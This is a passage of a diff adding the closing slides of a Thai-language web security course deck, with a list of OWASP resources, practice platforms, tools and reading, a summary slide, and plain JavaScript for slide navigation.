+                        <ul>
+                            <li>OWASP Top 10: <a href="https://owasp.org/Top10/" target="_blank">owasp.org/Top10/</a></li>
+                            <li>OWASP Cheat Sheets: <a href="https://cheatsheetseries.owasp.org/" target="_blank">cheatsheetseries.owasp.org</a></li>
+                            <li>OWASP Juice Shop: <a href="https://owasp.org/www-project-juice-shop/" target="_blank">Juice Shop</a></li>
+                            <li>DVWA: <a href="https://github.com/digininja/DVWA" target="_blank">github.com/digininja/DVWA</a></li>
+                        </ul>
+                    </div>
+                    <div class="card">
+                        <h3>🎮 Learning Platforms</h3>
+                        <ul>
+                            <li>PortSwigger Web Security Academy</li>
+                            <li>HackTheBox: <a href="https://www.hackthebox.com/" target="_blank">hackthebox.com</a></li>
+                            <li>TryHackMe: <a href="https://tryhackme.com/" target="_blank">tryhackme.com</a></li>
+                            <li>PentesterLab</li>
+                        </ul>
+                    </div>
+                </div>
+                <div class="grid-2" style="margin-top: 30px;">
+                    <div class="card">
+                        <h3>🔧 Tools</h3>
+                        <ul>
+                            <li>Burp Suite Community</li>
+                            <li>OWASP ZAP</li>
+                            <li>sqlmap (SQLi automation)</li>
+                            <li>XSStrike</li>
+                        </ul>
+                    </div>
+                    <div class="card">
+                        <h3>📖 Recommended Reading</h3>
+                        <ul>
+                            <li>The Web Application Hacker's Handbook</li>
+                            <li>OWASP Testing Guide</li>
+                            <li>Tangled Web by Michal Zalewski</li>
+                        </ul>
+                    </div>
+                </div>
+            </div>
+
+            <!-- Slide 38: Thank You -->
+            <div class="slide title-slide">
+                <h1>🎓 สรุปการเรียนรู้</h1>
+                <div class="quote-box" style="background: rgba(255,255,255,0.2); color: white; border-left: 5px solid white;">
+                    <p style="font-size: 1.5em; font-style: italic;">
+                        "Security is not a product, but a process."
+                    </p>
+                    <p style="text-align: right; margin-top: 10px;">- Bruce Schneier</p>
+                </div>
+                <div style="margin-top: 50px;">
+                    <h2>📝 สิ่งที่ต้องทำ</h2>
+                    <ul style="list-style: none; font-size: 1.3em; margin-top: 20px;">
+                        <li>✅ ทำ Lab 3 และส่งรายงาน</li>
+                        <li>✅ ทำ Quiz Week 7</li>
+                        <li>✅ เตรียมตัวสอบกลางภาค</li>
+                        <li>✅ ศึกษาเพิ่มเติมจาก Resources ที่แนะนำ</li>
+                    </ul>
+                </div>
+                <div style="margin-top: 50px; font-size: 1.2em;">
+                    <p>💬 Questions? มีคำถามเพิ่มเติม?</p>
+                    <p>📧 ติดต่ออาจารย์ผู้สอนได้ทันที</p>
+                </div>
+            </div>
+
+        </div>
+    </div>
+
+    <!-- Navigation Controls -->
+    <div class="controls">
+        <button class="control-btn" id="prevBtn" onclick="prevSlide()">← Previous</button>
+        <button class="control-btn" id="nextBtn" onclick="nextSlide()">Next →</button>
+    </div>
+
+    <script>
+        let currentSlide = 0;
+        const slides = document.querySelectorAll('.slide');
+        const totalSlides = slides.length;
+        const progressBar = document.getElementById('progressBar');
+        const slideCounter = document.getElementById('slideCounter');
+        const prevBtn = document.getElementById('prevBtn');
+        const nextBtn = document.getElementById('nextBtn');
+
+        // Initialize
+        updateSlideDisplay();
+
+        function showSlide(n) {
+            slides.forEach(slide => slide.classList.remove('active'));
+            
+            if (n >= totalSlides) {
+                currentSlide = totalSlides - 1;
+            } else if (n < 0) {
+                currentSlide = 0;
+            } else {
+                currentSlide = n;
+            }
+            
+            slides[currentSlide].classList.add('active');
+            updateSlideDisplay();
+        }
+
+        function updateSlideDisplay() {
+            // Update progress bar
+            const progress = ((currentSlide + 1) / totalSlides) * 100;
+            progressBar.style.width = progress + '%';
+            
+            // Update counter
+            slideCounter.textContent = `${currentSlide + 1} / ${totalSlides}`;
+            
+            // Update buttons
+            prevBtn.disabled = currentSlide === 0;
+            nextBtn.disabled = currentSlide === totalSlides - 1;
+        }
+
+        function nextSlide() {
+            showSlide(currentSlide + 1);
+        }
+
+        function prevSlide() {
+            showSlide(currentSlide - 1);
+        }
+
+        // Keyboard navigation
+        document.addEventListener('keydown', function(e) {
+            if (e.key === 'ArrowRight' || e.key === ' ') {
+                e.preventDefault();
+                nextSlide();
+            } else if (e.key === 'ArrowLeft') {
+                e.preventDefault();
+                prevSlide();
+            } else if (e.key === 'Home') {
+                e.preventDefault();
+                showSlide(0);
+            } else if (e.key === 'End') {
+                e.preventDefault();
+                showSlide(totalSlides - 1);
+            }
+        });
+
+        // Font size control
+        let currentFontSize = 1;
+        
+        function increaseFontSize() {
+            if (currentFontSize < 1.5) {
+                currentFontSize += 0.1;
+                document.documentElement.style.setProperty('--font-size-base', currentFontSize + 'rem');
+            }
+        }
+
+        function decreaseFontSize() {
+            if (currentFontSize > 0.8) {
+                currentFontSize -= 0.1;
+                document.documentElement.style.setProperty('--font-size-base', currentFontSize + 'rem');
+            }
+        }
+
+        function resetFontSize() {
+            currentFontSize = 1;
+            document.documentElement.style.setProperty('--font-size-base', '1rem');
+        }
+
+        // Fullscreen
+        function toggleFullscreen() {
+            if (!document.fullscreenElement) {
+                document.documentElement.requestFullscreen();
+            } else {
+                if (document.exitFullscreen) {
+                    document.exitFullscreen();
+                }
+            }
+        }
+
+        // Touch swipe support for mobile
+        let touchStartX = 0;
+        let touchEndX = 0;
+
+        document.addEventListener('touchstart', e => {
+            touchStartX = e.changedTouches[0].screenX;
+        });
+
+        document.addEventListener('touchend', e => {
+            touchEndX = e.changedTouches[0].screenX;
+            handleSwipe();
+        });
+
+        function handleSwipe() {
+            if (touchEndX < touchStartX - 50) {
+                nextSlide();
+            }
+            if (touchEndX > touchStartX + 50) {
+                prevSlide();
+            }
+        }
+
+        // Auto-scroll to top when changing slides
+        slides.forEach(slide => {
+            const observer = new MutationObserver(() => {
+                if (slide.classList.contains('active')) {
+                    slide.scrollTop = 0;
+                }
+            });
+            observer.observe(slide, { attributes: true, attributeFilter: ['class'] });
+        });
+    </script>
+</body>
+</html>
